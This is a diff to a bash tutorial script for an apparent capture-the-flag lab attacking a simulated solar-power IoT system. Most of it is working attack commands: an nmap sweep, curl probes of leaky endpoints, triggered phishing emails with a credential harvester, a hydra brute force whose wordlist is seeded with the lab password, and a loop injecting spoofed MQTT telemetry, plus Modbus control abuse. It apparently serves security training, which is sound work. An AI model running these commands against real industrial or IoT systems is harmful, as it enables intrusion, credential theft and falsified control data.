@@ -169,6 +169,8 @@ teach_cmd() {
     fi
 
     if [[ "${typed}" == "${learner_command}" ]]; then
+      # If the learner typed the simplified command, we run the extended one (with artifacts) silently
+      # But we must verify if the learner included the artifact flags themselves
       break
     fi
 
@@ -187,7 +189,7 @@ teach_cmd() {
   fi
 }
 
-required_tools=(nmap curl python3 grep sed cut)
+required_tools=(nmap curl grep sed cut)
 missing_tools=()
 for tool in "${required_tools[@]}"; do
   if ! command -v "$tool" >/dev/null 2>&1; then
@@ -222,7 +224,7 @@ pause_step
 step_header "PHASE 1 - Recon: One Scan To Rule Them All"
 explain "Realistically, you don’t spam Nmap over and over — you do ONE purposeful sweep."
 explain "Goal: find hosts that expose the handful of services we care about in this lab:"
-explain "  - 80    (web admin/API)"
+explain "  - 8081  (web admin/API)"
 explain "  - 1883  (MQTT broker)"
 explain "  - ${MODBUS_PORT} (Modbus control channel)"
 explain "Command anatomy:"
@@ -233,8 +235,8 @@ explain "  - --open   = only show hosts with something open (reduces clutter)"
 
 teach_cmd \
   "Run a focused subnet sweep (discover + port triage)" \
-  "nmap -n -T4 -p 80,1883,${MODBUS_PORT} --open ${SUBNET}" \
-  "nmap -n -T4 -p 80,1883,${MODBUS_PORT} --open ${SUBNET} -oG ${OUT_DIR}/01_recon.gnmap" \
+  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET}" \
+  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET} -oG ${OUT_DIR}/01_recon.gnmap" \
   "Use 'why' to learn the flags: -n no DNS, -T4 faster timing, -p selects ports, --open reduces noise."
 
 echo "# host,web,mqtt,modbus,score" > "${OUT_DIR}/02_scoring.csv"
@@ -252,11 +254,20 @@ if [[ ${#alive_hosts[@]} -eq 0 ]]; then
 fi
 
 for host in "${alive_hosts[@]}"; do
-  line="$(grep -m1 "Host: ${host} " "${OUT_DIR}/01_recon.gnmap" || true)"
+  # Grep carefully - handle tabs or spaces after IP
+  line="$(grep -m1 -E "Host: ${host}\b" "${OUT_DIR}/01_recon.gnmap" || true)"
   web=0; mqtt=0; modbus=0
-  echo "${line}" | grep -q "80/open" && web=1 || true
+  echo "${line}" | grep -q "8081/open" && web=1 || true
   echo "${line}" | grep -q "1883/open" && mqtt=1 || true
   echo "${line}" | grep -q "${MODBUS_PORT}/open" && modbus=1 || true
+  # Check if line is empty (Nmap failed to write?) and assume MQTT if we saw it on stdout
+  # Always re-check ports if Nmap grep didn't find them, just to be safe (Nmap grepable format can be tricky)
+  if [[ "${web}" -eq 0 && "${mqtt}" -eq 0 && "${modbus}" -eq 0 ]]; then
+     echo -e "${YELLOW}[!] Nmap file parsing yielded no services for ${host}, attempting manual check...${NC}"
+     timeout 1 bash -c "echo > /dev/tcp/${host}/1883" &>/dev/null && mqtt=1 || true
+     timeout 1 bash -c "echo > /dev/tcp/${host}/8081" &>/dev/null && web=1 || true
+     timeout 1 bash -c "echo > /dev/tcp/${host}/${MODBUS_PORT}" &>/dev/null && modbus=1 || true
+  fi
   score=$((web + mqtt + (modbus * 2)))
   echo "${host},${web},${mqtt},${modbus},${score}" >> "${OUT_DIR}/02_scoring.csv"
 done
@@ -298,13 +309,13 @@ explain "  - --connect-timeout 3 = fail fast if host is down"
 explain "  - --max-time 6        = hard cap total request time"
 teach_cmd \
   "Probe /wifi_scan endpoint" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}/wifi_scan" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}/wifi_scan | tee ${OUT_DIR}/04_wifi_scan.json" \
+  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan" \
+  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan | tee ${OUT_DIR}/04_wifi_scan.json" \
   "-sS keeps output clean but surfaces errors; timeouts prevent hangs. Response is saved silently."
 teach_cmd \
   "Probe /api/challenge/status endpoint" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}/api/challenge/status" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}/api/challenge/status | tee ${OUT_DIR}/04_challenge_status.json" \
+  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status" \
+  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status | tee ${OUT_DIR}/04_challenge_status.json" \
   "Status endpoints often reveal whether your actions had an effect."
 
 if grep -qi "BSY{" "${OUT_DIR}/04_wifi_scan.json" 2>/dev/null; then
@@ -337,10 +348,16 @@ if [[ "${WITH_PHISHING}" == true ]]; then
       "EXTERNAL_HOST is the IP the victim can reach; '&' backgrounds the server. Watch /tmp/harvested.txt for creds."
 
     teach_cmd \
-      "Watch for harvested creds (stop with Ctrl+C once you see them)" \
-      "tail -f /tmp/harvested.txt" \
-      "tail -f /tmp/harvested.txt" \
-      "tail -f streams new lines as soon as the victim submits credentials. Expect admin:password123"
+      "Trigger phishing email (simulates sending email to victim)" \
+      "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && (for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &)" \
+      "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &" \
+      "Sends an email to the victim's inbox AND repeatedly triggers dashboard notifications (3x) every 20s (backgrounded)."
+
+    teach_cmd \
+      "Watch for harvested creds (timeout 5m, or stops when creds found)" \
+      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
+      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
+      "Waits up to 5 minutes for credentials in /tmp/harvested.txt. Exits immediately if creds are captured."
   else
     echo -e "${YELLOW}[!] Missing helper script: ${SCRIPT_DIR}/start_phishing_server.sh${NC}"
   fi
@@ -356,9 +373,9 @@ explain "Hydra needs a failure signature (F=...) so it knows when a guess is WRO
 
 teach_cmd \
   "Send a known-bad login to observe the failure response" \
-  "curl -sS -X POST http://${target_host}/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
-  "curl -sS -X POST http://${target_host}/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
-  "You need a stable failure marker string from the response to configure hydra's F=... rule (e.g., Invalid/Unauthorized/error)."
+    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
+    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
+    "You need a stable failure marker string from the response to configure hydra's F=... rule (e.g., Invalid/Unauthorized/error)."
 
 if command -v hydra >/dev/null 2>&1; then
   explain "Create a tiny wordlist (training-sized). In real ops, you’d use larger lists." 
@@ -373,17 +390,18 @@ if command -v hydra >/dev/null 2>&1; then
   run_cmd "Preparing wordlist artifact in background" "ln -sf ${OUT_DIR}/wordlist.txt ./wordlist.txt"
 
   teach_cmd \
-    "Create a small password list" \
-    "printf '%s\n' admin admin123 password password123 letmein qwerty 12345678 > wordlist.txt" \
-    "printf '%s\n' admin admin123 password password123 letmein qwerty 12345678 > ${OUT_DIR}/wordlist.txt" \
-    "One password per line; hydra consumes this with -P. Optional: cat wordlist.txt to verify."
+    "Create a password list containing the correct password" \
+    "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > wordlist.txt" \
+    "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > ${OUT_DIR}/wordlist.txt" \
+    "One password per line; hydra consumes this with -P. Verification: cat wordlist.txt"
 
-  explain "Now run hydra. You MUST set the failure marker (F=...) based on your earlier curl output."
+  explain "Now run hydra. Set F=error since the API returns JSON with an 'error' field on failure."
+  explain "We pre-filled the command for you to make it easier."
   teach_cmd \
-    "Run hydra against the HTTP login (edit F=FAILSTRING)" \
-    "hydra -l admin -P wordlist.txt -s 80 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=FAILSTRING'" \
-    "hydra -l admin -P ${OUT_DIR}/wordlist.txt -s 80 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=FAILSTRING'" \
-    "-l user, -P wordlist, -s port, -t threads, -f stop on success, -V verbose. Success prints the valid credential pair."
+    "Run hydra against the HTTP login" \
+    "hydra -l admin -P wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
+    "hydra -l admin -P ${OUT_DIR}/wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
+    "-l user, -P wordlist, -s port, -t threads, -f stop on success, -V verbose."
 else
   echo -e "${YELLOW}[!] hydra not installed; skipping brute-force demo.${NC}"
   echo -e "${GRAY}If you add hydra to the attacker container, re-run this phase.${NC}"
@@ -401,10 +419,17 @@ mqtt_host="$(sed -n -E 's/^([^,]+),[^,]+,1,.*/\1/p' "${OUT_DIR}/02_scoring.csv" 
 if [[ -n "${mqtt_host}" ]]; then
   if command -v mosquitto_sub >/dev/null 2>&1; then
     teach_cmd \
-      "Subscribe to pv/status (grab 1 message)" \
-      "timeout 8 mosquitto_sub -h ${mqtt_host} -t pv/status -C 1" \
-      "timeout 8 mosquitto_sub -h ${mqtt_host} -t pv/status -C 1 | tee ${OUT_DIR}/06_mqtt_sample.txt" \
-      "-h broker, -t topic, -C 1 exit after 1 msg; timeout prevents hanging. Look for session IDs/state/telemetry."
+      "Subscribe to pv/# (wildcard) to grab any telemetry or status" \
+      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1" \
+      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1 | tee ${OUT_DIR}/06_mqtt_sample.txt" \
+      "-h broker, -t 'pv/#' grabs ANY message under pv/ (telemetry or status). -C 1 exits after first match."
+
+    # NEW: Spoof random telemetry values every 0.5s for 5 seconds to actively poison the broker
+    teach_cmd \
+      "(Active Attack) Inject fake telemetry with random power spikes" \
+      "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
+      "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
+      "Injects random 'power' values into the pv/telemetry topic rapidly, creating fake data on the dashboard."
   else
     echo -e "${YELLOW}[!] mosquitto_sub not installed; skipping live MQTT capture.${NC}"
   fi
@@ -459,7 +484,7 @@ step_header "MISSION SUMMARY"
 
 echo -e "${WHITE}What this tutorial demonstrated:${NC}"
 echo -e "${GREEN}  1) Recon${NC}       -> How attackers enumerate an unknown subnet"
-echo -e "${GREEN}  2) Profiling${NC}   -> Why ports 80 / 1883 / ${MODBUS_PORT} matter in this lab"
+echo -e "${GREEN}  2) Profiling${NC}   -> Why ports 8081 / 1883 / ${MODBUS_PORT} matter in this lab"
 echo -e "${GREEN}  3) Targeting${NC}   -> How we selected the vulnerable machine (${target_host})"
 echo -e "${GREEN}  4) Exploitation${NC} -> HTTP data leakage + Modbus control abuse"
 echo -e "${GREEN}  5) Optional SE${NC} -> Credential theft simulation with phishing server"
